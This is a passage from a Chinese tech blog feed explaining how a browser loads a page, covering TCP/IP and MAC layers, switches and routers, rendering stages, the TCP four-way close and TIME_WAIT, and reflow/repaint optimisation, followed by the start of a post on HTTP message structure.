"data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/03/03/bt3nG6.jpg" alt="bt3nG6.jpg"></a></p><p>如果您听说过初始页面加载的14Kb规则，TCP慢开始就是初始响应为14Kb的原因，也是为什么web性能优化需要将此初始14Kb响应作为优化重点的原因。TCP慢开始逐渐建立适合网络能力的传输速度，以避免拥塞。</p><p>当服务器用TCP包来发送数据时，客户端通过返回确认帧来确认传输。由于硬件和网络条件，连接的容量是有限的。 如果服务器太快地发送太多的包，它们可能会被丢弃。意味着，将不会有确认帧的返回。服务器把它们当做确认帧丢失。拥塞控制算法使用这个发送包和确认帧流来确定发送速率。</p><h3 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h3><p>TCP模块在执行<strong>连接</strong>、<strong>收发</strong>、<strong>断开</strong>等各阶段操作时，都需要<strong>委托IP模块将数据封装成网络包发送给通信对象</strong>。</p><p>在IP协议里面需要有<strong>源地址IP</strong>和<strong>目标地址IP</strong>:</p><ul><li>源地址IP，即是客户端输出的IP地址;</li><li>目标地址，即通过DNS域名解析得到的Web服务器IP。</li></ul><p>因为HTTP是经过TCP传输的，所以在IP包头的协议号，要填写为06(十六进制)，表示协议为TCP。</p><p><strong>MAC</strong></p><p>生成了IP头部之后，接下来网络包还需要在IP头部的前面加上<strong>MAC头部</strong>。</p><p>MAC头部是以太网使用的头部，它包含了接收方和发送方的<strong>MAC地址</strong>等信息。</p><p>在MAC包头里需要发送方MAC地址和接收方目标MAC地址，用于两点之间的传输。</p><h2 id="网卡"><a href="#网卡" class="headerlink" title="网卡"></a>网卡</h2><p>网络包只是存放在内存中的一串二进制数字信息，没有办法直接发送给对方。因此，我们需要将<strong>数字信息转换为电信号</strong>，才能在网线上传输，也就是说，这才是真正的数据发送过程。</p><p>负责执行这一操作的是网卡，要控制网卡还需要靠网卡驱动程序。</p><p><strong>网卡驱动从IP模块获取到包之后，会将其复制到网卡内的缓存区中，接着会在其开头加上报头和起始帧分界符，在末尾加上用于检测错误的帧校验序列。</strong></p><p><a href="https://imgtu.com/i/btQlrj"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/03/03/btQlrj.png" alt="btQlrj.png"></a></p><ul><li>起始帧分界符是一个用来表示包起始位置的标记</li><li>末尾的FCS(帧校验序列)用来检查包传输过程是否有损坏</li></ul><p>最后<strong>网卡会将包转为电信号，通过网线发送出去</strong>。</p><h2 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h2><p>交换机的设计是将网络包原样转发到目的地。交换机工作在<strong>MAC层</strong>，也称为二层网络设备。</p><p><strong>交换机根据MAC地址表查找 MAC地址，然后将信号发送到相应的端口。</strong></p><h2 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h2><p>网络包经过交换机之后，现在到达了路由器，并在此被转发到下一个路由器或目标设备。</p><p>这一步转发的工作原理和交换机类似，也是通过查表判断包转发的目标。</p><p>不过在具体的操作过程上，路由器和交换机是有区别的。</p><ul><li>因为<strong>路由器是基于IP设计</strong>的，俗称三层网络设备，路由器的各个<strong>端口</strong>都具有<strong>MAC地址</strong>和<strong>IP地址</strong>;</li><li>而<strong>交换机是基于以太网设计</strong>的，俗称二层网络设备，交换机的端口<strong>不具有MAC地址</strong>。</li></ul><p>路由器的端口具有MAC地址，因此它就能够成为以太网的发送方和接收方；</p><p>同时还具有IP地址，从这个意义上来说，它和计算机的网卡是一样的。</p><p>当转发包时，首先路由器端口会接收发给自己的以太网包，然后路由表查询转发目标，再由相应的端口作为发送方将以太网包发送出去。</p><h2 id="服务器处理请求并返回-HTTP-报文"><a href="#服务器处理请求并返回-HTTP-报文" class="headerlink" title="服务器处理请求并返回 HTTP 报文"></a>服务器处理请求并返回 HTTP 报文</h2><p><a href="https://imgtu.com/i/btlOtx"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/03/03/btlOtx.png" alt="btlOtx.png"></a></p><p>数据包抵达服务器后，服务器会先扒开数据包的<strong>MAC头部</strong>，查看是否和服务器自己的MAC地址符合，符合就将包收起来。</p><p>接着继续扒开数据包的<strong>IP头</strong>，发现IP地址符合，根据IP头中协议项，知道自己上层是<strong>TCP协议</strong>。</p><p>于是，扒开TCP的头，里面有<strong>序列号</strong>，需要看一看这个序列包是不是我想要的，如果是就放入缓存中然后返回一个<strong>ACK</strong>，如果不是就丢弃。TCP头部里面还有<strong>端口号</strong>，HTTP的服务器正在监听这个端口号。</p><p>于是，服务器自然就知道是HTTP进程想要这个包，于是就将包发给<strong>HTTP进程</strong>。</p><p>服务器的HTTP进程看到，原来这个请求是要访问一个页面，于是就把这个网页封装在HTTP响应报文里。</p><p>HTTP响应报文也需要穿上TCP、IP、MAC头部，不过这次是源地址是服务器IP地址，目的地址是客户端P地址。</p><h2 id="浏览器解析渲染页面"><a href="#浏览器解析渲染页面" class="headerlink" title="浏览器解析渲染页面"></a>浏览器解析渲染页面</h2><p>浏览器拿到HTTP响应报文后，接下来介绍下浏览器渲染机制</p><p><a href="https://imgtu.com/i/5J63Rg"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://z3.ax1x.com/2021/10/16/5J63Rg.png" alt="5J63Rg.png"></a></p><p>浏览器解析渲染页面分为一下五个步骤：</p><ul><li>根据 HTML 解析出 DOM 树</li><li>根据 CSS 解析生成 CSS 规则树（<strong>CSSOM</strong>）</li><li>结合 DOM 树和 CSS 规则树，生成渲染树</li><li>根据渲染树计算每一个节点的信息</li><li>根据计算好的信息绘制页面</li></ul><p><a href="https://imgtu.com/i/btNIeO"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/03/03/btNIeO.png" alt="btNIeO.png"></a></p><h3 id="根据-HTML-解析出-DOM-树"><a href="#根据-HTML-解析出-DOM-树" class="headerlink" title="根据 HTML 解析出 DOM 树"></a>根据 HTML 解析出 DOM 树</h3><p>第一步是处理HTML标记并构造DOM树。HTML解析涉及到<strong>标记化</strong>和<strong>树的构造</strong>。</p><p>HTML标记包括开始和结束标记，以及属性名和值。 </p><p>如果文档格式良好，则解析它会简单而快速。解析器将标记化的输入解析到文档中，构建DOM树。</p><p>DOM树描述了文档的内容。<code>&lt;html&gt;</code>元素是第一个标签也是文档树的根节点。</p><p>树反映了不同标记之间的关系和层次结构。嵌套在其他标记中的标记是子节点。</p><p>DOM节点的数量越多，构建DOM树所需的时间就越长。</p><p>当解析器发现非阻塞资源，例如一张<strong>图片</strong>，浏览器会请求这些资源并且继续解析。</p><p>当遇到一个<strong>CSS</strong>文件时，解析也可以继续进行。</p><p>但是对于<code>&lt;script&gt;</code>标签（特别是没有 <code>async</code> 或者 <code>defer</code> 属性）会<strong>阻塞渲染并停止HTML的解析</strong>。</p><p>尽管浏览器的预加载扫描器加速了这个过程，但过多的脚本仍然是一个重要的瓶颈。</p><p>浏览器构建DOM树时，这个过程占用了<strong>主线程</strong>。</p><p>当这种情况发生时，<strong>预加载</strong>扫描仪将解析可用的内容并请求高优先级资源，如CSS、JavaScript和web字体。</p><p>多亏了预加载扫描器，我们不必等到解析器找到对外部资源的引用来请求它。</p><p>它将<strong>在后台检索资源，以便在主HTML解析器到达请求的资源时，它们可能已经在运行，或者已经被下载</strong>。</p><p>预加载扫描仪提供的优化<strong>减少了阻塞</strong>。</p><h3 id="根据-CSS-解析生成-CSS-规则树（CSSOM）"><a href="#根据-CSS-解析生成-CSS-规则树（CSSOM）" class="headerlink" title="根据 CSS 解析生成 CSS 规则树（CSSOM）"></a>根据 CSS 解析生成 CSS 规则树（CSSOM）</h3><p>第二步是处理CSS并构建CSSOM树。CSS对象模型和DOM是相似的。</p><p><strong>DOM和CSSOM是两棵树. 它们是独立的数据结构。</strong></p><p>浏览器将CSS规则转换为可以理解和使用的样式映射。</p><p>浏览器遍历CSS中的每个规则集，根据CSS选择器创建具有父、子和兄弟关系的节点树。</p><p>与HTML一样，浏览器需要将接收到的CSS规则转换为可以使用的内容。因此，它重复了HTML到对象的过程，但这是对于CSS的。</p><p>CSSOM树包括来自用户代理样式表的样式。</p><p>浏览器从适用于节点的最通用规则开始，并通过应用更具体的规则递归地优化计算的样式。换句话说，它级联属性值。</p><p>构建CSSOM非常非常快，并且在当前的开发工具中没有以独特的颜色显示。</p><p>相反，开发人员工具中的“重新计算样式”显示解析CSS、构造CSSOM树和递归计算计算样式所需的总时间。</p><p>在web性能优化方面，它是可轻易实现的，因为创建CSSOM的总时间通常小于一次DNS查找所需的时间。</p><h3 id="JavaScript-编译"><a href="#JavaScript-编译" class="headerlink" title="JavaScript 编译"></a>JavaScript 编译</h3><p>当CSS被解析并创建CSSOM时，其他资源，包括JavaScript文件正在下载（多亏了preload scanner）。JavaScript被解释、编译、解析和执行。脚本被解析为抽象语法树。</p><h3 id="渲染"><a href="#渲染" class="headerlink" title="渲染"></a>渲染</h3><p>渲染步骤包括<strong>样式</strong>、<strong>布局</strong>、绘制，在某些情况下还包括合成。</p><p>在解析步骤中创建的<strong>CSSOM树和DOM树组合成一个Render树</strong>，然后用于计算每个可见元素的布局，然后将其绘制到屏幕上。</p><p>在某些情况下，可以将内容提升到它们自己的层并进行合成，通过在GPU而不是CPU上绘制屏幕的一部分来提高性能，从而释放主线程。</p><h4 id="Style"><a href="#Style" class="headerlink" title="Style"></a>Style</h4><p>第三步是将DOM和CSSOM组合成一个Render树，计算样式树或渲染树从DOM树的根开始构建，遍历每个可见节点。</p><p>像<code>&lt;head&gt;</code>和它的<strong>子节点</strong>以及任何具有<code>display: none</code>样式的结点，例如<code>script &#123; display: none; &#125;</code>这些标签将<strong>不会显示</strong>，也就是它们不会出现在Render树上。</p><p>具有<code>visibility: hidden</code>的节点<strong>会出现在Render树上，因为它们会占用空间</strong>。</p><p>每个可见节点都应用了其CSSOM规则。</p><p>Render树保存所有具有内容和计算样式的可见节点——<strong>将所有相关样式匹配到DOM树中的每个可见节点，并根据CSS级联确定每个节点的计算样式。</strong></p><h4 id="Layout"><a href="#Layout" class="headerlink" title="Layout"></a>Layout</h4><p>第四步是<strong>在渲染树上运行布局以计算每个节点的几何体</strong>。</p><p>布局是确定呈现树中所有节点的宽度、高度和位置，以及确定页面上每个对象的大小和位置的过程。</p><p><strong>回流是对页面的任何部分或整个文档的任何后续大小和位置的确定。</strong></p><p>构建渲染树后，开始布局。渲染树标识显示哪些节点（即使不可见）及其计算样式，但不标识每个节点的尺寸或位置。</p><p>为了确定每个对象的确切大小和位置，浏览器从渲染树的根开始遍历它。</p><p>在网页上，大多数东西都是一个盒子。不同的设备和不同的桌面意味着无限数量的不同的视区大小。</p><p>在此阶段，考虑到视区大小，浏览器将确定屏幕上所有不同框的尺寸。</p><p><strong>以视区的大小为基础</strong>，布局通常从body开始，用每个元素的框模型属性排列所有body的子孙元素的尺寸，为不知道其尺寸的替换元素（例如图像）提供占位符空间。</p><p><strong>第一次确定节点的大小和位置称为布局。</strong></p><p><strong>随后对节点大小和位置的重新计算称为回流。</strong></p><p>在我们的示例中，<strong>假设初始布局发生在返回图像之前。由于我们没有声明图像的大小，因此一旦知道图像大小，就会有回流。</strong></p><h4 id="Paint"><a href="#Paint" class="headerlink" title="Paint"></a>Paint</h4><p>最后一步是将各个节点绘制到屏幕上，第一次出现的节点称为<strong>首次有意义的绘制</strong>(FMP) 。</p><p>在绘制或光栅化阶段，浏览器将在布局阶段计算的每个框转换为屏幕上的实际像素。</p><p>绘画包括将元素的每个可视部分绘制到屏幕上，包括<strong>文本、颜色、边框、阴影和替换的元素（如按钮和图像）</strong>。</p><p>浏览器需要非常快地完成这项工作。</p><p>为了确保平滑滚动和动画，占据主线程的所有内容，包括计算样式，以及回流和绘制，必须让浏览器在16.67毫秒内完成。</p><p>在2048x 1536，iPad有超过314.5万像素将被绘制到屏幕上。那是很多像素需要快速绘制。</p><p><strong>为了确保重绘的速度比初始绘制的速度更快，屏幕上的绘图通常被分解成数层。如果发生这种情况，则需要进行合成。</strong></p><p>绘制可以将布局树中的元素分解为多个层。将内容提升到GPU上的层（而不是CPU上的主线程）可以提高绘制和重新绘制性能。</p><p><strong>有一些特定的属性和元素可以实例化一个层</strong>，包括<code>&lt;video&gt;</code>和<code>&lt;canvas&gt;</code>，任何CSS属性为<code>opacity</code>、3D <code>transform</code>, <code>will-change</code>的元素，还有一些其他元素。</p><p>这些节点将与子节点一起绘制到它们自己的层上，除非子节点由于上述一个（或多个）原因需要自己的层。</p><p>分层确实可以提高性能，但是它以<strong>内存管理</strong>为代价，因此不应作为web性能优化策略的一部分过度使用。</p><h4 id="Compositing"><a href="#Compositing" class="headerlink" title="Compositing"></a>Compositing</h4><p>当文档的各个部分以不同的层绘制，相互重叠时，必须进行<strong>合成</strong>，以确保它们以正确的顺序绘制到屏幕上，并正确显示内容。</p><p>当页面继续加载资产时，可能会发生回流（回想一下我们迟到的示例图像），<strong>回流会触发重新绘制和重新组合</strong>。</p><p>如果我们定义了图像的大小，就不需要重新绘制，只需要重新绘制需要重新绘制的层，并在必要时进行合成。</p><p>但<strong>我们没有定义图像大小！从服务器获取图像后，渲染过程将返回到布局步骤并从那里重新开始。</strong></p><h3 id="交互"><a href="#交互" class="headerlink" title="交互"></a>交互</h3><p>一旦主线程绘制页面完成，你会认为我们已经“准备好了”，但事实并非如此。</p><p>如果加载包含JavaScript（并且延迟到<code>onload</code>事件激发后执行），则<strong>主线程可能很忙</strong>，无法用于滚动、触摸和其他交互。</p><p>”Time to Interactive“（TTI）是测量从第一个请求导致DNS查找和SSL连接到页面<strong>可交互</strong>时所用的时间——可交互是”First Contentful Paint“之后的时间点，页面在50ms内响应用户的交互。</p><p><strong>如果主线程正在解析、编译和执行JavaScript，则它不可用，因此无法及时（小于50ms）响应用户交互。</strong></p><p>在我们的示例中，可能图像加载很快，但<code>anotherscript.js</code>文件可能是2MB，而且用户的网络连接很慢。</p><p>在这种情况下，用户可以非常快地看到页面，但是在下载、解析和执行脚本之前，就无法滚动。这不是一个好的用户体验。</p><h2 id="断开TCP连接-四次挥手"><a href="#断开TCP连接-四次挥手" class="headerlink" title="断开TCP连接 四次挥手"></a>断开TCP连接 四次挥手</h2><p><strong>双方都可以主动断开连接，断开连接后主机中的「资源」将被释放。</strong></p><p><a href="https://imgtu.com/i/btNzm8"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/03/03/btNzm8.png" alt="btNzm8.png"></a></p><ul><li>客户端打算关闭连接，此时会发送一个TCP首部<code>FIN</code> 标志位被置为<code>1</code>的报文，也即<code>FIN</code> 报文，之后客户端进入<code>FIN_WAIT_1</code>状态。</li><li>服务端收到该报文后，就向客户端发送<code>ACK</code>应答报文，接着服务端进入<code>CLOSED_WAIT</code>状态。</li><li>客户端收到服务端的<code>ACK</code>应答报文后，之后进入<code>FIN_WAIT_2</code>状态。</li><li>等待<strong>服务端处理完数据后</strong>，也向客户端发送<code>FIN</code> 报文，之后服务端进入<code>LAST_ACK</code>状态。</li><li>客户端收到服务端的<code>FIN</code> 报文后，回一个<code>ACK</code>应答报文，之后进入<code>TIME_WAIT</code>状态。</li><li>服务器收到了<code>ACK</code>应答报文后，就进入了<code>CLOSED</code>状态，至此<strong>服务端已经完成连接的关闭</strong>。</li><li>客户端在经过<code>2MSL</code>一段时间后，自动进入<code>CLOSED</code>状态，至此<strong>客户端也完成连接的关闭</strong>。</li></ul><p>你可以看到，每个方向都需要一个<code>FIN</code>和一个<code>ACK</code>，因此通常被称为<strong>四次挥手</strong>。</p><p>这里一点需要注意是∶<strong>主动关闭连接的，才有TIME_WAIT状态</strong>。</p><h3 id="为什么挥手需要四次"><a href="#为什么挥手需要四次" class="headerlink" title="为什么挥手需要四次?"></a>为什么挥手需要四次?</h3><p>再来回顾下四次挥手双方发FIN 包的过程，就能理解为什么需要四次了。</p><ul><li>关闭连接时，客户端向服务端发送<code>FIN</code> 时，仅仅表示<strong>客户端不再发送数据了但是还能接收数据</strong>。</li><li>服务器收到客户端的<code>FIN</code>报文时，先回一个<code>ACK</code>应答报文，而服务端可能还有数据需要处理和发送，等<br>服务端不再发送数据时，才发送<code>FIN</code>报文给客户端来表示同意现在关闭连接。</li></ul><p>从上面过程可知，<strong>服务端通常需要等待完成数据的发送和处理</strong>，所以服务端的<code>ACK</code>和 <code>FIN</code>一般都会分开发送，从而比三次握手导致多了一次。</p><h3 id="为什么TIME-WAIT等待的时间是2MSL"><a href="#为什么TIME-WAIT等待的时间是2MSL" class="headerlink" title="为什么TIME_WAIT等待的时间是2MSL?"></a>为什么TIME_WAIT等待的时间是2MSL?</h3><p><code>MSL</code>是<code>Maximum Segment Lifetime</code>，报文最大生存时间，它是任何报文在网络上存在的最长时间，超过这个时间报文将被丢弃。因为TCP报文基于是IP协议的，而IP头中有一个<code>TTL</code>字段，是IP数据报可以经过的最大路由数，每经过一个处理他的路由器此值就减1，当此值为0则数据报将被丢弃，同时发送<code>ICMP</code>报文通知源主机。</p><p><code>MSL</code>与<code>TTL</code>的区别:</p><p>MSL的单位是时间，而TTL是经过路由跳数。所以 MSL应该要大于等于TTL消耗为0的时间，以确保报文已被自然消亡。</p><p><code>TIME_WAIT</code> 等待<strong>2倍的MSL</strong>，比较合理的解释是︰网络中可能存在<strong>来自发送方的数据包</strong>,当这些发送方的数据包被接收方处理后又会向对方发送响应，所以一来一回需要等待⒉倍的时间。</p><p>如果被动关闭方没有收到断开连接的最后的ACK报文，就会触发超时重发Fin 报文，另一方接收到FIN后，会重发ACK给被动关闭方，—来一去正好2个MSL。</p><p>2MSL 的时间是<strong>从客户端接收到FIN后发送 ACK开始计时的</strong>。如果在TIME-WAIT时间内，因为客户端的ACK没有传输到服务端，客户端又接收到了服务端重发的FIN 报文，那么2MSL时间将重新计时。</p><h3 id="为什么需要TIME-WAIT状态"><a href="#为什么需要TIME-WAIT状态" class="headerlink" title="为什么需要TIME_WAIT状态?"></a>为什么需要TIME_WAIT状态?</h3><p>主动发起关闭连接的一方，才会有<code>TIME-WAIT</code>状态。</p><p>需要TIME-WAIT状态，主要是两个原因︰</p><ul><li>防止具有相同「四元组」的「旧」数据包被收到;</li><li>保证「被动关闭连接」的一方能被正确的关闭，即<strong>保证最后的ACK能让被动关闭方接收，从而帮助其正常关闭;</strong></li></ul><p>经过<code>2MSL</code>这个时间，<strong>足以让两个方向上的数据包都被丢弃，使得原来连接的数据包在网络中都自然消失，再出现的数据包一定都是新建立连接所产生的。</strong></p><p><code>TIME-WAIT</code>更重要的作用是<strong>等待足够的时间以确保最后的ACK能让被动关闭方接收，从而帮助其正常关闭</strong>。</p><h2 id="性能优化之回流重绘"><a href="#性能优化之回流重绘" class="headerlink" title="性能优化之回流重绘"></a>性能优化之回流重绘</h2><h3 id="回流-重排reflow"><a href="#回流-重排reflow" class="headerlink" title="回流/重排reflow"></a>回流/重排reflow</h3><p><strong>当Render Tree中部分或全部元素的尺寸、结构、或某些属性发生改变时，浏览器重新渲染部分或全部文档的过程</strong>。</p><h3 id="重绘Repaint"><a href="#重绘Repaint" class="headerlink" title="重绘Repaint"></a>重绘Repaint</h3><p><strong>当页面中元素样式的改变并不影响它在文档流中的位置时（例如：color、background-color、visibility等），浏览器会将新样式赋予给元素并重新绘制它</strong>。</p><p>根据 Opera 的说法，重绘成本很高，<strong>因为浏览器必须验证 DOM 树中所有其他节点的可见性</strong>。</p><p>回流对性能甚至更为关键，因为它涉及<strong>影响页面一部分（或整个页面）布局的更</strong>改。元素的重排会导致所有子元素和祖先元素以及 DOM 中跟随它的任何元素的后续<strong>回流</strong>。回流在性能方面非常昂贵，并且是导致 DOM 脚本缓慢的主要原因之一，尤其是在处理能力较低的设备上，例如手机。在很多情况下，它们相当于重新布局整个页面。</p><p>不幸的是，很多事情都会引发回流。其中一些在编写 CSS 时特别相关：</p><ul><li>调整窗口大小</li><li>更改字体</li><li>添加或删除样式表</li><li>内容更改，例如用户在输入框中键入文本</li><li>激活 CSS 伪类，例如 :hover（在 IE 中激活兄弟的伪类）</li><li>操作类属性</li><li>操作 DOM 的脚本</li><li>计算offsetWidth 和 offsetHeight</li><li>设置样式属性的属性</li></ul><h3 id="如何避免回流或至少最小化它们对性能的影响？"><a href="#如何避免回流或至少最小化它们对性能的影响？" class="headerlink" title="如何避免回流或至少最小化它们对性能的影响？"></a>如何避免回流或至少最小化它们对性能的影响？</h3><h4 id="在-dom-树中尽可能低地更改类"><a href="#在-dom-树中尽可能低地更改类" class="headerlink" title="在 dom 树中尽可能低地更改类"></a>在 dom 树中尽可能低地更改类</h4><p>当回流信息传递到周围节点时，回流可以是自上而下或自下而上的。回流是不可避免的，但您可以减少它们的影响。在 dom 树中尽可能低地更改类，从而将回流的范围限制在尽可能少的节点上。例如，您应该避免更改包装元素上的类以影响子节点的显示。面向对象的 css 总是尝试将类附加到它们影响的对象（DOM 节点或节点），但在这种情况下，它具有最小化回流影响的额外性能优势。</p><h4 id="避免设置多个内联样式"><a href="#避免设置多个内联样式" class="headerlink" title="避免设置多个内联样式"></a>避免设置多个内联样式</h4><p>我们都知道与 DOM 交互很慢。我们尝试将更改分组到一个不可见的 DOM 树片段中，然后当整个更改应用于 DOM 时仅导致一次重排。同样，通过 style 属性设置样式会导致重排。避免设置多个内联样式，每个样式都会导致重排，样式应该组合在一个外部类中，当操作元素的类属性时，只会导致一个重排。</p><h4 id="应用动画到fixed或absolute的定位"><a href="#应用动画到fixed或absolute的定位" class="headerlink" title="应用动画到fixed或absolute的定位"></a>应用动画到fixed或absolute的定位</h4><p>将动画应用于fixed或absolute的定位元素。它们不会影响其他元素的布局，因此它们<strong>只会导致重绘而不是完全回流</strong>。这成本要低得多。</p><h4 id="以平滑换取速度"><a href="#以平滑换取速度" class="headerlink" title="以平滑换取速度"></a>以平滑换取速度</h4><p>Opera 还建议我们以平滑换取速度。他们的意思是，您可能希望一次将动画移动 1 个像素，但如果动画和随后的回流使用 100% 的 CPU，则动画会看起来很跳跃，因为浏览器难以更新流程。一次将动画元素移动 3 个像素在速度非常快的机器上可能看起来不太流畅，但在速度较慢的机器和移动设备上不会导致 CPU 抖动。</p><h4 id="避免使用表格进行布局（或设置表格布局固定）"><a href="#避免使用表格进行布局（或设置表格布局固定）" class="headerlink" title="避免使用表格进行布局（或设置表格布局固定）"></a>避免使用表格进行布局（或设置表格布局固定）</h4><p>避免使用表格进行布局。好像您需要另一个理由来避免它们一样，<strong>表格通常需要多次传递才能完全建立布局</strong>，因为它们是元素会影响 DOM 上出现在它们之前的其他元素的显示的罕见情况之一。想象一下表格末尾的一个单元格，其内容非常宽，导致列完全调整大小。这就是为什么表格不是在所有浏览器中逐步呈现的原因，这也是为什么它们不适合布局的另一个原因。根据 Mozilla 的说法，<strong>即使是很小的更改也会导致表中所有其他节点的回流。</strong></p><p>YUI 数据表小部件的所有者 Jenny Donnelly 建议<strong>对数据表使用固定布局</strong>，以实现更高效的布局算法。除“auto”之外的任何 table-layout 值都将触发固定布局并允许表格根据 CSS 2.1 规范逐行呈现。Quirksmode 表明浏览器对 table-layout 属性的支持在所有主要浏览器中都很好。</p><blockquote><p>以这种方式，一旦接收到整个第一行，用户代理就可以开始布置表格。后续行中的单元格不影响列宽。任何具有溢出内容的单元格都使用“溢出”属性来确定是否剪切溢出内容。</p></blockquote><blockquote><p>该算法可能效率低下，因为它要求用户代理在确定最终布局之前可以访问表中的所有内容，并且可能需要不止一次通过。</p></blockquote><h4 id="避免在-CSS-中使用JavaScript-表达式"><a href="#避免在-CSS-中使用JavaScript-表达式" class="headerlink" title="避免在 CSS 中使用JavaScript 表达式"></a>避免在 CSS 中使用JavaScript 表达式</h4><p>这条规则很老套，但很好。<strong>这些表达式如此昂贵</strong>的主要原因是因为每次文档或文档的一部分重排时都会重新计算它们。正如我们从触发回流的所有许多事情中看到的那样，它每秒可能发生数千次。</p><p>可能指CSS表达式？（例如：<code>calc()</code>）</p><h4 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h4><ul><li><strong>避免频繁操作样式</strong>，最好一次性重写style属性，或者将样式列表定义为class并一次性更改class属性。</li><li><strong>避免频繁操作DOM</strong>。</li><li>也可以先为元素设置<code>display: none</code>，操作结束后再把它显示出来。因为在display属性为none的元素上进行的DOM操作不会引发回流和重绘。</li><li><strong>避免频繁读取会引发回流/重绘的属性</strong>，如果确实需要多次使用，就用一个变量缓存起来。</li><li>对具有复杂动画的元素使用<strong>绝对定位</strong>，使它脱离文档流，否则会引起父元素及后续元素频繁回流。</li></ul><h4 id="React的虚拟DOM"><a href="#React的虚拟DOM" class="headerlink" title="React的虚拟DOM"></a>React的虚拟DOM</h4><p>React的虚拟DOM的作用是将真实 DOM 的副本存储在内存中。当您修改 DOM 时，它首先将这些更改应用到内存中的 DOM。然后，使用它的差异算法，找出真正发生了什么变化。最后，它对更改进行批处理，并调用一次将它们应用到 real-dom 上。因此，<strong>最大限度地减少了回流和重绘。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;从URL输入到页面展现到底发生什么？&quot;&gt;&lt;a href=&quot;#从URL输入到页面展现到底发生什么？&quot; class=&quot;headerlink&quot; title=&quot;从URL输入到页面展现到底发生什么？&quot;&gt;&lt;/a&gt;从URL输入到页面展现到底发生什么？&lt;/h1&gt;&lt;p&gt;&lt;a hre</summary>
      
    
    
    
    <category term="浏览器" scheme="https://lesliewaong.top/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
    <category term="HTTP" scheme="https://lesliewaong.top/tags/HTTP/"/>
    
    <category term="TCP" scheme="https://lesliewaong.top/tags/TCP/"/>
    
    <category term="DNS" scheme="https://lesliewaong.top/tags/DNS/"/>
    
    <category term="浏览器渲染" scheme="https://lesliewaong.top/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93/"/>
    
    <category term="回流重绘" scheme="https://lesliewaong.top/tags/%E5%9B%9E%E6%B5%81%E9%87%8D%E7%BB%98/"/>
    
  </entry>
  
  <entry>
    <title>HTTP相关内容</title>
    <link href="https://lesliewaong.top/posts/2c5b9cd5.html"/>
    <id>https://lesliewaong.top/posts/2c5b9cd5.html</id>
    <published>2022-03-02T03:11:12.000Z</published>
    <updated>2022-03-25T14:08:26.418Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTTP相关内容"><a href="#HTTP相关内容" class="headerlink" title="HTTP相关内容"></a>HTTP相关内容</h1><h2 id="HTTP基本概念"><a href="#HTTP基本概念" class="headerlink" title="HTTP基本概念"></a>HTTP基本概念</h2><p>HTTP是<strong>超文本传输协议</strong>，也就是<strong>HyperText Transfer Protocol</strong>。</p><p><strong>HTTP是一个在计算机世界里专门在「两点」之间「传输」文字、图片、音频、视频等「超文本」数据的「约定和规范」。</strong></p><blockquote><p>那HTTP是用于从互联网服务器传输超文本到本地浏览器的协议，这种说法正确吗?</p></blockquote><p>这种说法是不正确的。因为也可以是「服务器&lt;–&gt;服务器」﹐所以采用两点之间的描述会更准确。</p><h2 id="HTTP报文的组成部分"><a href="#HTTP报文的组成部分" class="headerlink" title="HTTP报文的组成部分"></a>HTTP报文的组成部分</h2><p><a href="https://imgtu.com/i/5KMFne"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://z3.ax1x.com/2021/10/13/5KMFne.png" alt="5KMFne.png"></a></p><p>在回答此问题时，我们要按照顺序回答：</p><ul><li><p>先回答的是，http报文包括：<strong>请求报文</strong>和<strong>响应报文</strong>。</p></li><li><p>再回答的是，每个报文包含什么部分。</p></li><li><p>最后回答，每个部分的内容是什么</p></li></ul><h3 id="请求报文包括："><a href="#请求报文包括：" class="headerlink" title="请求报文包括："></a>请求报文包括：</h3><p><a href="https://imgtu.com/i/5KMk0H"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://z3.ax1x.com/2021/10/13/5KMk0H.jpg" alt="5KMk0H.jpg"></a></p><ul><li><p>请求行：包括请求方法、请求的URL、HTTP协议及版本。</p></li><li><p>请求头：一大堆的键值对。</p></li><li><p><strong>空行</strong>指的是：当服务器在解析请求头的时候，如果遇到了空行，则表明，后面的内容是请求体。</p></li><li><p>请求体：数据部分。</p></li></ul><h3 id="常见字段有哪些"><a href="#常见字段有哪些" class="headerlink" title="常见字段有哪些?"></a>常见字段有哪些?</h3><h4 id="Host字段"><a href="#Host字段" class="headerlink" title="Host字段"></a>Host字段</h4><p>客户端发送请求时，用来指定服务器的域名。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Host: www .A.com</span><br></pre></td></tr></table></figure><p>有了<code>Host</code>字段，就可以将请求发往<strong>同一台</strong>服务器上的<strong>不同网站</strong>。</p><h4 id="Content-Length-字段"><a href="#Content-Length-字段" class="headerlink" title="Content-Length 字段"></a>Content-Length 字段</h4><p>浏览器报文中实体数据的大小</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Length: <span class="number">1000</span></span><br></pre></td></tr></table></figure><h4 id="Connection字段"><a href="#Connection字段" class="headerlink" 